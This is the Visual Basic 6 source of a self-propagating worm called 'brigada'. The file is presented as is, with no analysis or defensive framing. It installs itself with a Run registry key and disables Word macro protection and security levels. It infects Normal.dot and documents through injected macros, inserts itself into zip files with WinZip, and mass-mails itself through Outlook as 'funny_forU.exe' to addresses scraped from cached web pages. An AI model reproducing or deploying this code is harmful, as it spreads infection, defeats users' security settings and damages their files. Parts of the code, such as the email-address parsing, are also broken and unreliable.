Attribute VB_Name = "Module1"
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
Private Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpFileName As String) As Long
Private Declare Function GetCommandLine Lib "kernel32" Alias "GetCommandLineA" () As Long
Private Declare Function lstrlen Lib "kernel32" Alias "lstrlenA" (ByVal lpString As Long) As Long
Private Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" (ByVal pidl As Long, ByVal pszPath As String) As Long
Private Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" (ByVal hwndOwner As Long, ByVal nFolder As Long, pidl As ITEMIDLIST) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Public brigv As String
Public cache As String
Public winzip As String


Const CSIDL_PERSONAL = &H5
Const CSIDL_STARTUP = &H7
Const MAX_PATH = 260
Private Type SHITEMID
    cb As Long
    abID As Byte
End Type
Private Type ITEMIDLIST
    mkid As SHITEMID
End Type

Sub Main()
On Error Resume Next
Dim fso, ws
Dim lngbuf
Dim bbyte As Byte
Set fso = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("WScript.Shell")

If InStr(1, GetCommLine, "-active") = 0 Then

Call Install(App.Path & "\" & App.EXEName & ".exe", fso.GetSpecialfolder(1) & "\Ms0701i32.exe")

brigv = "C:\"
Randomize (Timer)
For i = 1 To 8
brigv = brigv & Chr(Int(Rnd(1) * 26) + 97)
Next i
brigv = brigv & ".txt"

Call DocVir
Call VbsDrop

winzip = ws.RegRead("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\winzip32.exe\")
If Len(winzip) <> 0 Then Call list("C:\")

cache = ws.RegRead("HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache")
If Len(cache) <> 0 Then Call listht(cache)

Else

Sleep 20000
DeleteFile GetSpecialfolder(CSIDL_STARTUP) & "\brigada.vbs"

End If

End Sub

Sub Install(src As String, dest As String)
On Error Resume Next
Set ws = CreateObject("WScript.Shell")
FileCopy src, dest
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Patch", dest & " -active"
End Sub

Sub list(dir)
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set ssf = fso.GetFolder(dir).SubFolders
For Each fil In ssf
infection (fil.Path)
list (fil.Path)
Next
End Sub

Sub infection(dir)
Set fso = CreateObject("Scripting.FileSystemObject")
Set cf = fso.GetFolder(dir).Files
For Each fil In cf
ext = fso.GetExtensionName(fil.Path)
ext = LCase(ext)
If (ext = "zip") Then
Call Shell(winzip & " -a -r " & fil.Path & " " & fso.GetSpecialfolder(1) & "\Ms0701i32.exe", vbHide)
End If
Next
End Sub

Sub DocVir()
On Error Resume Next
Dim lngbufferlen
Dim bbyte As Byte
Dim pefile As String
orig = App.Path & "\" & App.EXEName & ".exe"

Open orig For Binary As #1
DoEvents
Do While Not EOF(1)
DoEvents
Get #1, , bbyte
e = Hex(bbyte)
If Len(e) = 1 Then e = "0" & Hex(bbyte)
pefile = pefile & e
Loop
Close #1

hexf = "pef = """
For i = 1 To Len(pefile) Step 110
hexf = hexf & Mid(pefile, i, 110) & """" & vbCrLf & "brighex = brighex & """
Next
hexf = hexf & """" & vbCrLf

inst = "read = dec(brighex)" & vbCrLf & _
        "Set r = fso.CreateTextFile(fso.GetSpecialFolder(1) & ""\Ms0701i32.exe"", 2)" & vbCrLf & _
        "r.Write read" & vbCrLf & _
        "r.Close" & vbCrLf & _
        "ws.RegWrite ""HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Path"", fso.GetSpecialFolder(1) & ""\Ms0701i32.exe -active"""

conv = "Function dec(octe)" & vbCrLf & _
        "On Error Resume Next" & vbCrLf & _
        "For hexad = 1 To Len(octe) Step 2" & vbCrLf & _
        "dec = dec & Chr(""&h"" & Mid(octe, hexad, 2))" & vbCrLf & _
        "Next" & vbCrLf & _
        "End Function" & vbCrLf
        
infwrd = "Set doc = ActiveDocument.VBProject.VBComponents(1)" & vbCrLf & _
        "Set nor = NormalTemplate.VBProject.VBComponents(1)" & vbCrLf & _
        "With Options" & vbCrLf & _
        ".ConfirmConversions = False" & vbCrLf & _
        ".VirusProtection = False" & vbCrLf & _
        ".SaveNormalPrompt = False" & vbCrLf & _
        "End With" & vbCrLf & _
        "Select Case Application.Version" & vbCrLf & _
        "Case ""10.0""" & vbCrLf & _
        "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"", ""Level"") = 1&" & vbCrLf & _
        "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"", ""AccessVBOM"") = 1&" & vbCrLf & _
        "Case ""9.0""" & vbCrLf & _
        "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"", ""Level"") = 1&" & vbCrLf & _
        "End Select" & vbCrLf & _
        "WordBasic.DisableAutoMacros 0" & vbCrLf & vbCrLf & _
        "If nor.Name <> ""brigada"" Then"

infwrd2 = "install doc, nor" & vbCrLf & _
        "End If" & vbCrLf & _
        "If doc.Name <> ""brigada"" Then" & vbCrLf & _
        "install nor, doc" & vbCrLf & _
        "Activedocument.Save" & vbCrLf & _
        "End If"
        
instal = "Private Sub install(src, dst)" & vbCrLf & _
        "Set odst = dst.CodeModule" & vbCrLf & _
        "Set osrc = src.CodeModule" & vbCrLf & _
        "odst.DeleteLines 1, odst.CountOfLines" & vbCrLf & _
        "odst.InsertLines 1, osrc.Lines(1, osrc.CountOfLines)" & vbCrLf & _
        "End Sub" & vbCrLf

Open brigv For Output As #1
Print #1, "Private Sub Document_Open()"
Print #1, "On Error Resume Next"
Print #1, "Set fso=CreateObject(""Scripting.FileSystemObject"")"
Print #1, "Set ws=CreateObject(""WScript.Shell"")" & vbCrLf
Print #1, hexf
Print #1, infwrd
Print #1, inst
Print #1, infwrd2
Print #1, "End Sub" & vbCrLf
Print #1, instal
Print #1, conv
Close #1
End Sub

Sub VbsDrop()
On Error Resume Next
vbsdrp = GetSpecialfolder(CSIDL_STARTUP) & "\brigada.vbs"

vbs = "On Error Resume Next" & vbCrLf & _
        "set fso=createobject(""scripting.filesystemobject"")" & vbCrLf & _
        "set ws=createobject(""wscript.shell"")" & vbCrLf & _
        "Set wrd=createObject(""Word.Application"")" & vbCrLf & _
        "wrd.options.virusprotection=0" & vbCrLf & _
        "wrd.options.savenormalprompt=0" & vbCrLf & _
        "wrd.options.confirmconversions=0" & vbCrLf & _
        "ws.regwrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level"",1,""REG_DWORD""" & vbCrLf & _
        "ws.regwrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\Level"",1,""REG_DWORD""" & vbCrLf & _
        "ws.regwrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\AccessVBOM"",1,""REG_DWORD""" & vbCrLf & _
        "If wrd.normaltemplate.vbproject.vbcomponents(1).name <> ""brigada"" then" & vbCrLf & _
        "wrd.normaltemplate.vbproject.vbcomponents(1).codemodule.addfromfile(""" & brigv & """)" & vbCrLf & _
        "wrd.normaltemplate.vbproject.vbcomponents(1).name=""brigada""" & vbCrLf & _
        "End If" & vbCrLf & _
        "wscript.sleep 500" & vbCrLf & _
        "fso.deletefile """ & brigv & """" & vbCrLf & _
        "wrd.application.quit"

Open vbsdrp For Output As #1
Print #1, vbs
Close #1
End Sub

Sub listht(dir)
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set ssfh = fso.GetFolder(dir).SubFolders
For Each filh In ssfh
infht (filh.Path)
listht (filh.Path)
Next
End Sub

Sub infht(dir)
Dim mlto As String
Set fso = CreateObject("Scripting.FileSystemObject")
Set cfh = fso.GetFolder(dir).Files
For Each filh In cfh
ext = fso.GetExtensionName(filh.Path)
ext = LCase(ext)
If (ext = "htm") Or (ext = "html") Then
Set h = fso.OpenTextFile(filh.Path, 1)
allhtm = h.ReadAll
h.Close
For j = 1 To Len(allhtm)
If Mid(allhtm, j, 7) = "mailto:" Then
mlto = ""
cnt = 0
Do While Mid(allhtm, j + 7 + cnt, 1)
cnt = cnt + 1
Loop
Call SendMail(mlto)
End If
Next
End If
Next
End Sub

Sub SendMail(email As String)
Dim out
filen = App.Path & "\" & App.EXEName & ".exe"
Set out = CreateObject("Outlook.Application")
Set map = out.GetNameSpace("MAPI")
map.Logon "profile", "password"
Set mel = out.CreateItem(0)
mel.To = email
mel.Subject = "Look at this..."
mel.Body = "Very Funny and it's for you." & vbCrLf & vbCrLf & _
            vbTab & "Good Bye."
mel.Attachments.Add , 1, 1, "funny_forU.exe"
'mel.DeleteafterSubmit = True
mel.Send
map.Logoff
Set out = Nothing

End Sub

Private Function GetCommLine() As String
    Dim RetStr As Long, SLen As Long
    Dim Buffer As String
    RetStr = GetCommandLine
    SLen = lstrlen(RetStr)
    If SLen > 0 Then
        GetCommLine = Space$(SLen)
        CopyMemory ByVal GetCommLine, ByVal RetStr, SLen
    End If
End Function

Private Function GetSpecialfolder(CSIDL As Long) As String
    Dim r As Long
    Dim IDL As ITEMIDLIST
    r = SHGetSpecialFolderLocation(100, CSIDL, IDL)
    If r = NOERROR Then
        Path$ = Space$(512)
        r = SHGetPathFromIDList(ByVal IDL.mkid.cb, ByVal Path$)
        GetSpecialfolder = Left$(Path, InStr(Path, Chr$(0)) - 1)
        Exit Function
    End If
    GetSpecialfolder = ""
End Function
